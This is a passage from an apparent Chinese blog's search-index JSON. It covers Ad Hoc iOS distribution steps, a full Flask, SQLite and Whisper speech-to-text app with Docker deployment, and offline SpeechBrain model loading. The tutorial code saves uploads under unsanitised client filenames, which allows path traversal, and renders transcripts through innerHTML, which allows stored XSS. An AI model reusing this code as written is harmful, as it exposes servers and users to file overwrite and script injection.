[JsonPropertyName(\u0026#34;content-available\u0026#34;)] public int ContentAvailable { get; set; } } 注意： voip 推送则需要voip的证书\nAd Hoc Ad Hoc 分发是苹果提供的小规模测试或内部分发方式，最多支持 100 台设备，适用于 App 上架 App Store 前的内部验证。\n前提条件 拥有一个苹果开发者账号（个人或公司类型均可）。 准备好目标设备的UDID（可通过 iTunes、Xcode 或 3uTools 等第三方工具获取）。\n操作步骤 1. 注册设备 登录 Apple Developer 官网，进入 Certificates, Identifiers \u0026amp; Profiles 页面。 点击左侧菜单 Devices → 右上角 + 号，进入设备添加页面。 填写设备信息： 名称（自定义，如 “张三 iPhone 15”） 设备对应的 UDID 提交保存，完成设备注册（仅注册后的设备可安装 Ad Hoc 包）。\n2. 创建 App ID 在 Certificates, Identifiers \u0026amp; Profiles 页面，点击左侧 Identifiers → 右上角 + 号。 选择 “App IDs” 类别，点击 “Continue”。 填写核心信息： Bundle ID（需与 Xcode 项目中一致，格式例：com.yourcompany.appname） 勾选 App 所需功能（如推送通知、App Groups 等）。 提交保存，完成 App ID 创建。\n3. 创建证书 在 Certificates, Identifiers \u0026amp; Profiles 页面，点击左侧 Certificates → 右上角 + 号。 选择证书类型： 开发阶段：选择 iOS App Development 分发阶段：选择 iOS Distribution (Ad Hoc) 上传 CSR 文件（可通过 Mac 自带的 “钥匙串访问” 工具生成）。 苹果生成证书后，点击 “Download” 下载，双击证书即可安装到 Mac 的钥匙串中。\n4. 创建 Ad Hoc 描述文件（Provisioning Profile） 在 Certificates, Identifiers \u0026amp; Profiles 页面，点击左侧 Profiles → 右上角 + 号。 选择描述文件类型：Ad Hoc，点击 “Continue”。 依次选择： 已创建的 App ID 已创建的 分发证书 需安装 App 的 设备列表（仅注册过的设备可选） 提交保存后，下载描述文件，双击安装到 Xcode 中。\n5. 打包 App 打开 Xcode 项目，顶部设备选择栏中选择 Generic iOS Device（或具体已注册设备）。 点击顶部菜单 Product → Archive，等待 Xcode 生成 Archive 文件。 Archive 完成后，在弹出的 “Organizer” 窗口中，选择对应的 Archive 包，点击 Distribute App。 选择分发方式：Ad Hoc，后续步骤中选择已创建的 Ad Hoc 描述文件，最终导出**.ipa 文件**。\n6. 分发与安装 App 分发方式：可通过邮件、网盘、企业内部服务器等方式分享 .ipa 文件。 安装工具：用户需通过 iTunes，或 3uTools、爱思助手等第三方工具安装。 安装限制：.ipa 文件仅能安装在已注册 UDID 的设备上。\n注意事项 设备数量限制：每个苹果开发者账号，最多只能注册 100 台设备用于 Ad Hoc 分发。 证书有效期：个人开发者证书有效期为 1 年，证书过期后需重新创建证书并对 App 重新签名。 发布限制：Ad Hoc 分发仅用于内部测试，不可作为公开发布方式（如替代 App Store 上架）。\n参考 https://github.com/alexalok/dotAPNS\nhttps://developer.apple.com/system-status/\nhttps://dontpaniclabs.com/blog/post/2024/07/23/sending-apns-push-notifications-using-c-sharp/\n","permalink":"https://qfsyso.github.io/posts/apple-push-notification-system-for-csharp/","summary":"dotAPNS 通过 Apple Push Notification Service（APNs）发送推送通知的 .NET 库，采用官方推荐的 HTTP/2 API 实现方式。\n主要特性\n支持 HTTP/2 协议：符合 Apple 官方推荐的推送通知方式，适用于 iOS、macOS、watchOS 等平台。\n.NET 支持：兼容 .NET Framework 4.6、.NET Standard 2.0 和 2.1，适用于 ASP.NET Core 项目。\n简化集成：提供了 dotAPNS.AspNetCore 集成库，简化了在 ASP.NET Core 项目中的使用。\n认证方式：支持基于证书和基于令牌的认证方式，推荐使用令牌方式以避免证书转换的复杂性。\np12 使用 .p12 证书进行推送 dotAPNS 支持使用证书认证方式（.p12 文件）连接 APNs。 以下是使用 .p12 证书发送推送通知的基本步骤：\n加载证书： var cert = new X509Certificate2(\u0026#34;path_to_certificate.p12\u0026#34;, \u0026#34;certificate_password\u0026#34;); var apnsClient = ApnsClient.CreateUsingCert(cert); 构建推送通知：\nvar push = new ApplePush(ApplePushType.Alert) .AddAlert(\u0026#34;title\u0026#34;, \u0026#34;Hello, World!\u0026#34;) .AddToken(\u0026#34;device_token\u0026#34;); 发送通知：","title":"Apple Push Notification System For CSharp"},{"content":"WAV STT Python Flask 框架\nSQLite 做存储\n支持批量上传音频文件\n后端调用开源 STT 库\n支持音频回放和文本搜索\n/app ├── app.py # Flask 后端 ├── templates/ │ └── index.html # 前端页面 ├── static/ │ └── audio/ # 上传音频存储目录（Docker 内） ├── requirements.txt # 依赖 ├── Dockerfile └── stt_utils.py # STT 相关工具函数 后端核心功能 /：首页，返回上传页面\n/upload：接受多文件上传，保存音频，调用 STT 转文本，保存结果进 SQLite\n/audio/：提供音频文件访问，前端可回放\n/search：文本搜索接口，返回匹配记录\nSQLite 数据库保存：字段 id, filename, upload_time, transcript\nDocker requirements.txt\nflask whisper openai-whisper Code app.py\nimport os import sqlite3 from datetime import datetime from flask import Flask, request, render_template, send_from_directory, jsonify import whisper app = Flask(**name**) app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;] = \u0026#39;static/audio\u0026#39; os.makedirs(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], exist_ok=True) DB = \u0026#39;database.db\u0026#39; # 初始化模型（加载一次） model = whisper.load_model(\u0026#34;base\u0026#34;) def init_db(): with sqlite3.connect(DB) as conn: conn.execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS recordings ( id INTEGER PRIMARY KEY AUTOINCREMENT, filename TEXT, upload_time TEXT, transcript TEXT ) \u0026#39;\u0026#39;\u0026#39;) def insert_record(filename, transcript): with sqlite3.connect(DB) as conn: conn.execute(\u0026#34;INSERT INTO recordings (filename, upload_time, transcript) VALUES (?, ?, ?)\u0026#34;, (filename, datetime.now().isoformat(), transcript)) conn.commit() def search_transcripts(keyword): with sqlite3.connect(DB) as conn: cursor = conn.execute(\u0026#34;SELECT id, filename, upload_time, transcript FROM recordings WHERE transcript LIKE ?\u0026#34;, (\u0026#39;%\u0026#39;+keyword+\u0026#39;%\u0026#39;,)) return cursor.fetchall() def transcribe_audio(path): # whisper 转文本 result = model.transcribe(path) return result[\u0026#34;text\u0026#34;] @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def upload(): files = request.files.getlist(\u0026#39;files\u0026#39;) results = [] for file in files: filename = file.filename save_path = os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename) file.save(save_path) transcript = transcribe_audio(save_path) insert_record(filename, transcript) results.append({\u0026#39;filename\u0026#39;: filename, \u0026#39;transcript\u0026#39;: transcript}) return jsonify(results) @app.route(\u0026#39;/audio/\u0026lt;filename\u0026gt;\u0026#39;) def audio(filename): return send_from_directory(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename) @app.route(\u0026#39;/search\u0026#39;) def search(): keyword = request.args.get(\u0026#39;q\u0026#39;, \u0026#39;\u0026#39;) if not keyword: return jsonify([]) records = search_transcripts(keyword) results = [{\u0026#39;id\u0026#39;: r[0], \u0026#39;filename\u0026#39;: r[1], \u0026#39;upload_time\u0026#39;: r[2], \u0026#39;transcript\u0026#39;: r[3]} for r in records] return jsonify(results) if **name** == \u0026#39;**main**\u0026#39;: init_db() app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) templates/index.html\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;STT 批量上传 \u0026amp; 搜索\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;批量上传音频文件(wav/mp3)\u0026lt;/h2\u0026gt; \u0026lt;form id=\u0026#34;uploadForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;files\u0026#34; multiple accept=\u0026#34;audio/*\u0026#34; /\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;上传转文本\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;h2\u0026gt;搜索文本\u0026lt;/h2\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;searchInput\u0026#34; placeholder=\u0026#34;输入搜索关键词\u0026#34; /\u0026gt; \u0026lt;button onclick=\u0026#34;search()\u0026#34;\u0026gt;搜索\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;results\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; document.getElementById(\u0026#34;uploadForm\u0026#34;).onsubmit = async function (e) { e.preventDefault(); let files = e.target.files.files; let formData = new FormData(); for (let f of e.target.files.files) { formData.append(\u0026#34;files\u0026#34;, f); } let res = await fetch(\u0026#34;/upload\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: formData }); let data = await res.json(); alert(\u0026#34;上传并转写完成，刷新页面查看结果\u0026#34;); loadAll(); }; async function loadAll() { let res = await fetch(\u0026#34;/search?q=\u0026#34;); let data = await res.json(); showResults(data); } async function search() { let q = document.getElementById(\u0026#34;searchInput\u0026#34;).value; let res = await fetch(\u0026#34;/search?q=\u0026#34; + encodeURIComponent(q)); let data = await res.json(); showResults(data); } function showResults(data) { let container = document.getElementById(\u0026#34;results\u0026#34;); container.innerHTML = \u0026#34;\u0026#34;; for (let item of data) { container.innerHTML += `\u0026lt;div\u0026gt; \u0026lt;h4\u0026gt;${item.filename} [${item.upload_time}]\u0026lt;/h4\u0026gt; \u0026lt;audio controls src=\u0026#34;/audio/${item.filename}\u0026#34;\u0026gt;\u0026lt;/audio\u0026gt; \u0026lt;p\u0026gt;${item.transcript}\u0026lt;/p\u0026gt; \u0026lt;hr/\u0026gt; \u0026lt;/div\u0026gt;`; } } // 页面初始加载全部记录 loadAll(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Dockerfile\nFROM python:3.10-slim # 安装 ffmpeg 及其它依赖 RUN apt-get update \u0026amp;\u0026amp; apt-get install -y ffmpeg \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/\\* WORKDIR /app COPY requirements.txt ./ RUN pip install --no-cache-dir -r requirements.txt COPY . . RUN mkdir -p static/audio EXPOSE 5000 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 部署和启动\ndocker build -t stt-app . docker run -p 5000:5000 stt-app 浏览器打开 http://localhost:5000\n挂载目录 传目录改为 /opt/stt 修改 app.py：\napp.config[\u0026#39;UPLOAD_FOLDER\u0026#39;] = \u0026#39;/opt/stt\u0026#39; os.makedirs(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], exist_ok=True) 然后在 Docker 中挂载该目录：\ndocker run -p 5000:5000 -v /opt/stt:/opt/stt stt-app 上传成功后返回并在前端显示转写列表 之前的 /upload 路由已经有返回 results，我们需要：\n上传完自动显示这些内容\n页面加载时也展示数据库中已有的记录\n前端 更新 templates/index.html，使其支持美观展示上传列表 + 搜索：\n新版 templates/index.html\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;语音转文本 STT\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; body { font-family: sans-serif; margin: 20px; background-color: #f9f9f9; } h2 { color: #333; } form, .search { margin-bottom: 20px; padding: 10px; background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); } input[type=\u0026#34;file\u0026#34;], input[type=\u0026#34;text\u0026#34;] { padding: 8px; width: 100%; margin-top: 8px; margin-bottom: 8px; border: 1px solid #ccc; border-radius: 4px; } button { padding: 10px 20px; background: #007bff; border: none; border-radius: 4px; color: white; cursor: pointer; } button:hover { background: #0056b3; } .result { background: white; padding: 15px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05); } audio { width: 100%; margin-top: 10px; } .transcript { margin-top: 10px; font-size: 15px; color: #444; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;🎤 批量上传音频文件\u0026lt;/h2\u0026gt; \u0026lt;form id=\u0026#34;uploadForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;files\u0026#34; multiple accept=\u0026#34;audio/*\u0026#34; required /\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;上传并转写\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div class=\u0026#34;search\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;🔍 搜索转写内容\u0026lt;/h2\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;searchInput\u0026#34; placeholder=\u0026#34;输入关键词...\u0026#34; /\u0026gt; \u0026lt;button onclick=\u0026#34;search()\u0026#34;\u0026gt;搜索\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;h2\u0026gt;📄 转写结果\u0026lt;/h2\u0026gt; \u0026lt;div id=\u0026#34;results\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; document.getElementById(\u0026#34;uploadForm\u0026#34;).onsubmit = async function (e) { e.preventDefault(); let formData = new FormData(); let files = e.target.files.files; for (let f of files) { formData.append(\u0026#34;files\u0026#34;, f); } let res = await fetch(\u0026#34;/upload\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: formData, }); let data = await res.json(); alert(\u0026#34;上传成功！\u0026#34;); showResults(data); // 显示刚上传的结果 }; async function search() { let q = document.getElementById(\u0026#34;searchInput\u0026#34;).value; let res = await fetch(\u0026#34;/search?q=\u0026#34; + encodeURIComponent(q)); let data = await res.json(); showResults(data); } async function loadAll() { let res = await fetch(\u0026#34;/search?q=\u0026#34;); let data = await res.json(); showResults(data); } function showResults(data) { let container = document.getElementById(\u0026#34;results\u0026#34;); container.innerHTML = \u0026#34;\u0026#34;; for (let item of data) { container.innerHTML += ` \u0026lt;div class=\u0026#34;result\u0026#34;\u0026gt; \u0026lt;strong\u0026gt;${item.filename}\u0026lt;/strong\u0026gt;（${item.upload_time}） \u0026lt;audio controls src=\u0026#34;/audio/${item.filename}\u0026#34;\u0026gt;\u0026lt;/audio\u0026gt; \u0026lt;div class=\u0026#34;transcript\u0026#34;\u0026gt;${item.transcript}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; `; } } loadAll(); // 页面初始化加载所有记录 \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 最终 Dockerfile（包含 ffmpeg） FROM python:3.10-slim RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y ffmpeg \u0026amp;\u0026amp; \\ apt-get clean \u0026amp;\u0026amp; \\ rm -rf /var/lib/apt/lists/\\* WORKDIR /app COPY requirements.txt ./ RUN pip install --no-cache-dir -r requirements.txt COPY . . EXPOSE 5000 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 启动命令（挂载音频目录）\ndocker build -t stt-app . docker run -p 5000:5000 \\ -v /opt/stt:/opt/stt \\ stt-app 浏览器打开 访问：http://localhost:5000\n历史记录分页 app.py\nimport os import sqlite3 from datetime import datetime from flask import Flask, request, render_template, send_from_directory, jsonify import whisper app = Flask(**name**) app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;] = \u0026#39;/opt/stt\u0026#39; os.makedirs(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], exist_ok=True) DB = \u0026#39;database.db\u0026#39; 加载 Whisper 模型 model = whisper.load_model(\u0026#34;base\u0026#34;) def init_db(): with sqlite3.connect(DB) as conn: conn.execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS recordings ( id INTEGER PRIMARY KEY AUTOINCREMENT, filename TEXT, upload_time TEXT, transcript TEXT ) \u0026#39;\u0026#39;\u0026#39;) def insert_record(filename, transcript): with sqlite3.connect(DB) as conn: conn.execute( \u0026#34;INSERT INTO recordings (filename, upload_time, transcript) VALUES (?, ?, ?)\u0026#34;, (filename, datetime.now().isoformat(), transcript) ) conn.commit() def search*transcripts(keyword, page=1, per_page=5): offset = (page - 1) * per*page with sqlite3.connect(DB) as conn: if keyword: cursor = conn.execute( \u0026#34;SELECT COUNT(*) FROM recordings WHERE transcript LIKE ?\u0026#34;, (\u0026#39;%\u0026#39; + keyword + \u0026#39;%\u0026#39;,) ) total = cursor.fetchone()[0] cursor = conn.execute( \u0026#34;SELECT id, filename, upload_time, transcript FROM recordings WHERE transcript LIKE ? ORDER BY id DESC LIMIT ? OFFSET ?\u0026#34;, (\u0026#39;%\u0026#39; + keyword + \u0026#39;%\u0026#39;, per_page, offset) ) else: cursor = conn.execute(\u0026#34;SELECT COUNT(*) FROM recordings\u0026#34;) total = cursor.fetchone()[0] cursor = conn.execute( \u0026#34;SELECT id, filename, upload_time, transcript FROM recordings ORDER BY id DESC LIMIT ? OFFSET ?\u0026#34;, (per_page, offset) ) results = cursor.fetchall() return results, total def transcribe_audio(path): result = model.transcribe(path) return result[\u0026#34;text\u0026#34;] @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def upload(): files = request.files.getlist(\u0026#39;files\u0026#39;) results = [] for file in files: filename = file.filename save_path = os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename) file.save(save_path) transcript = transcribe_audio(save_path) insert_record(filename, transcript) results.append({\u0026#39;filename\u0026#39;: filename, \u0026#39;transcript\u0026#39;: transcript}) return jsonify(results) @app.route(\u0026#39;/audio/\u0026lt;filename\u0026gt;\u0026#39;) def audio(filename): return send_from_directory(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename) @app.route(\u0026#39;/search\u0026#39;) def search(): keyword = request.args.get(\u0026#39;q\u0026#39;, \u0026#39;\u0026#39;) page = int(request.args.get(\u0026#39;page\u0026#39;, 1)) per_page = 5 records, total = search_transcripts(keyword, page, per_page) total_pages = (total + per_page - 1) // per_page results = [ {\u0026#39;id\u0026#39;: r[0], \u0026#39;filename\u0026#39;: r[1], \u0026#39;upload_time\u0026#39;: r[2], \u0026#39;transcript\u0026#39;: r[3]} for r in records ] return jsonify({ \u0026#39;records\u0026#39;: results, \u0026#39;page\u0026#39;: page, \u0026#39;total_pages\u0026#39;: total_pages }) if **name** == \u0026#39;**main**\u0026#39;: init_db() app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 修改后的 templates/index.html\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;语音转文本 STT\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; body { font-family: sans-serif; margin: 20px; background-color: #f9f9f9; } h2 { color: #333; } form, .search { margin-bottom: 20px; padding: 10px; background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); } input[type=\u0026#34;file\u0026#34;], input[type=\u0026#34;text\u0026#34;] { padding: 8px; width: 100%; margin-top: 8px; margin-bottom: 8px; border: 1px solid #ccc; border-radius: 4px; } button { padding: 10px 20px; background: #007bff; border: none; border-radius: 4px; color: white; cursor: pointer; } button:hover { background: #0056b3; } .result { background: white; padding: 15px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05); } audio { width: 100%; margin-top: 10px; } .transcript { margin-top: 10px; font-size: 15px; color: #444; } .pagination { text-align: center; margin: 20px 0; } .pagination button { margin: 0 5px; background: #f0f0f0; color: #333; } .pagination button.active { background: #007bff; color: white; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;🎤 批量上传音频文件\u0026lt;/h2\u0026gt; \u0026lt;form id=\u0026#34;uploadForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;files\u0026#34; multiple accept=\u0026#34;audio/*\u0026#34; required /\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;上传并转写\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div class=\u0026#34;search\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;🔍 搜索转写内容\u0026lt;/h2\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;searchInput\u0026#34; placeholder=\u0026#34;输入关键词...\u0026#34; /\u0026gt; \u0026lt;button onclick=\u0026#34;search()\u0026#34;\u0026gt;搜索\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;h2\u0026gt;📄 转写结果\u0026lt;/h2\u0026gt; \u0026lt;div id=\u0026#34;results\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;pagination\u0026#34; id=\u0026#34;pagination\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; let currentPage = 1; let currentKeyword = \u0026#34;\u0026#34;; document.getElementById(\u0026#34;uploadForm\u0026#34;).onsubmit = async function (e) { e.preventDefault(); let formData = new FormData(); let files = e.target.files.files; for (let f of files) { formData.append(\u0026#34;files\u0026#34;, f); } let res = await fetch(\u0026#34;/upload\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: formData, }); let data = await res.json(); alert(\u0026#34;上传成功！\u0026#34;); search(1); // 刷新第一页 }; async function search(page = 1) { const q = document.getElementById(\u0026#34;searchInput\u0026#34;).value; currentKeyword = q; currentPage = page; let res = await fetch( `/search?q=${encodeURIComponent(q)}\u0026amp;page=${page}` ); let data = await res.json(); showResults(data.records, data.page, data.total_pages); } function showResults(records, page, totalPages) { let container = document.getElementById(\u0026#34;results\u0026#34;); container.innerHTML = \u0026#34;\u0026#34;; for (let item of records) { container.innerHTML += ` \u0026lt;div class=\u0026#34;result\u0026#34;\u0026gt; \u0026lt;strong\u0026gt;${item.filename}\u0026lt;/strong\u0026gt;（${item.upload_time}） \u0026lt;audio controls src=\u0026#34;/audio/${item.filename}\u0026#34;\u0026gt;\u0026lt;/audio\u0026gt; \u0026lt;div class=\u0026#34;transcript\u0026#34;\u0026gt;${item.transcript}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; `; } let pagination = document.getElementById(\u0026#34;pagination\u0026#34;); pagination.innerHTML = \u0026#34;\u0026#34;; if (totalPages \u0026gt; 1) { if (page \u0026gt; 1) { pagination.innerHTML += `\u0026lt;button onclick=\u0026#34;changePage(${ page - 1 })\u0026#34;\u0026gt;上一页\u0026lt;/button\u0026gt;`; } for (let i = 1; i \u0026lt;= totalPages; i++) { pagination.innerHTML += `\u0026lt;button class=\u0026#34;${ i === page ? \u0026#34;active\u0026#34; : \u0026#34;\u0026#34; }\u0026#34; onclick=\u0026#34;changePage(${i})\u0026#34;\u0026gt;${i}\u0026lt;/button\u0026gt;`; } if (page \u0026lt; totalPages) { pagination.innerHTML += `\u0026lt;button onclick=\u0026#34;changePage(${ page + 1 })\u0026#34;\u0026gt;下一页\u0026lt;/button\u0026gt;`; } } } function changePage(p) { search(p); } window.onload = function () { search(1); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 启动\ndocker run -p 5000:5000 -v /opt/stt:/opt/stt --name stt-app stt-app 扩展：本地模型 下载 Whisper 模型到本地 方式一：使用 Python 代码自动下载\npip install -U openai-whisper 然后在终端运行 Python：\npython3 import whisper model = whisper.load_model(\u0026#34;base\u0026#34;) # 可改为 \u0026#34;tiny\u0026#34;, \u0026#34;small\u0026#34;, \u0026#34;medium\u0026#34;, \u0026#34;large\u0026#34; 运行后，它会自动下载模型到本地缓存目录，一般是：\n~/.cache/whisper/base.pt -d \u0026ndash;restart=always\ndocker build -t stt-app . docker run -d --restart=always \\ -p 51000:5000 \\ -v /opt/stt:/opt/stt \\ --name stt-app stt-app 扩展：分离模型 提前下载模型文件，用 local_files_only=True 加载 可以在有外网的地方下载模型，然后打包复制到目标机器使用。\n步骤如下：\n在有外网的机器： from speechbrain.inference.separation import SepformerSeparation as separator # 第一次运行，会自动下载模型 model = separator.from_hparams(source=\u0026#34;speechbrain/sepformer-wsj02mix\u0026#34;, savedir=\u0026#34;pretrained_models/sepformer-wsj02mix\u0026#34;) print(\u0026#34;模型下载完毕\u0026#34;) 下载后的模型会存储在： Linux: ~/.cache/huggingface/hub 或指定的 savedir=\u0026quot;\u0026hellip;\u0026quot; 路径中\n把该文件夹复制到目标服务器 /root/room/pretrained_models/sepformer-wsj02mix\n修改代码为离线加载： from speechbrain.inference.separation import SepformerSeparation as separator # 离线加载模型（不会尝试联网） model = separator.from_hparams( source=\u0026#34;/root/room/pretrained_models/sepformer-wsj02mix\u0026#34;, savedir=\u0026#34;/root/room/pretrained_models/sepformer-wsj02mix\u0026#34;, run_opts={\u0026#34;local_files_only\u0026#34;: True} ) # 分离的语音文件 est_sources = model.separate_file(path=\u0026#34;多人混音.wav\u0026#34;) ... 注意 Sepformer 模型输入必须是 8kHz 采样率 SpeechBrain 官方预训练的分离模型（如 sepformer-wsj02mix）只接受 8kHz 的输入，否则会出错或效果异常。 所以我们必须在模型前 将音频从 48kHz 降采样到 8kHz，供模型处理。\n模型输出的音频也是 8kHz 所以在 torchaudio.save() 保存输出的时候默认是 8kHz。 加载支持更复杂场景的模型 model = separator.from_hparams( source=\u0026#34;speechbrain/sepformer-whamr\u0026#34;, savedir=\u0026#34;pretrained_models/sepformer-whamr\u0026#34; ) 使用 pyannote # https://huggingface.co/pyannote/speaker-diarization from pyannote.audio import Pipeline pipeline = Pipeline.from_pretrained(\u0026#34;pyannote/speaker-diarization@2.1\u0026#34;, use_auth_token=\u0026#34;ACCESS_TOKEN_GOES_HERE\u0026#34;) # apply the pipeline to an audio file diarization = pipeline(\u0026#34;audio.wav\u0026#34;) # dump the diarization output to disk using RTTM format with open(\u0026#34;audio.rttm\u0026#34;, \u0026#34;w\u0026#34;) as rttm: diarization.write_rttm(rttm) 下载 Sepformer 分离模型 镜像站 hf-mirror https://hf-mirror.com\n# 安装 git-lfs（大文件支持） apt update \u0026amp;\u0026amp; apt install git-lfs -y git lfs install # 克隆 sepformer 模型 git clone https://hf-mirror.com/speechbrain/sepformer-wsj02mix 下载完成后，模型文件会在：\nsepformer-wsj02mix/\n下载普通话 ASR 模型 # 克隆 AISHELL 普通话识别模型 git clone https://hf-mirror.com/speechbrain/asr-wav2vec2-ctc-aishell 下载完成后，模型文件会在：\nasr-wav2vec2-ctc-aishell/\nLibriSpeech 英语模型为例 # 安装必要库（如果尚未安装） # pip install speechbrain transformers from speechbrain.pretrained import EncoderDecoderASR asr_model = EncoderDecoderASR.from_hparams( source=\u0026#34;speechbrain/asr-crdnn-rnnlm-librispeech\u0026#34;, savedir=\u0026#34;pretrained_models/asr-crdnn-rnnlm-librispeech\u0026#34; ) # 对 WAV 文件进行转录识别 text = asr_model.transcribe_file(\u0026#34;path/to/file.wav\u0026#34;) print(\u0026#34;Transcription:\u0026#34;, text) 这个方法来自 SpeechBrain 官方教程，展示了其易用性和简洁性\n不同模型的额外示例 也可以尝试其他语言或架构的模型，例如：\n意大利语模型（基于 wav2vec2 + CTC/Attention）： from speechbrain.inference.ASR import EncoderDecoderASR asr_model = EncoderDecoderASR.from_hparams( source=\u0026#34;speechbrain/asr-wav2vec2-commonvoice-it\u0026#34;, savedir=\u0026#34;pretrained_models/asr-wav2vec2-commonvoice-it\u0026#34; ) text = asr_model.transcribe_file(\u0026#34;example-it.wav\u0026#34;) print(text) 普通话（AISHELL）模型： from speechbrain.inference.interfaces import foreign_class asr_model = foreign_class( source=\u0026#34;speechbrain/asr-wav2vec2-ctc-aishell\u0026#34;, pymodule_file=\u0026#34;custom_interface.py\u0026#34;, classname=\u0026#34;CustomEncoderDecoderASR\u0026#34; ) text = asr_model.transcribe_file(\u0026#34;example.wav\u0026#34;) print(text) Next Export wordpdf/login\n","permalink":"https://qfsyso.github.io/posts/wav-stt/","summary":"WAV STT Python Flask 框架\nSQLite 做存储\n支持批量上传音频文件\n后端调用开源 STT 库\n支持音频回放和文本搜索\n/app ├── app.py # Flask 后端 ├── templates/ │ └── index.html # 前端页面 ├── static/ │ └── audio/ # 上传音频存储目录（Docker 内） ├── requirements.txt # 依赖 ├── Dockerfile └── stt_utils.py # STT 相关工具函数 后端核心功能 /：首页，返回上传页面\n/upload：接受多文件上传，保存音频，调用 STT 转文本，保存结果进 SQLite\n/audio/：提供音频文件访问，前端可回放\n/search：文本搜索接口，返回匹配记录\nSQLite 数据库保存：字段 id, filename, upload_time, transcript\nDocker requirements.txt\nflask whisper openai-whisper Code app.py\nimport os import sqlite3 from datetime import datetime from flask import Flask, request, render_template, send_from_directory, jsonify import whisper app = Flask(**name**) app.","title":"WAV STT"},{"content":"Func 基于记忆密码和区分代号生成复杂密码\n支持设置密码长度（8-32 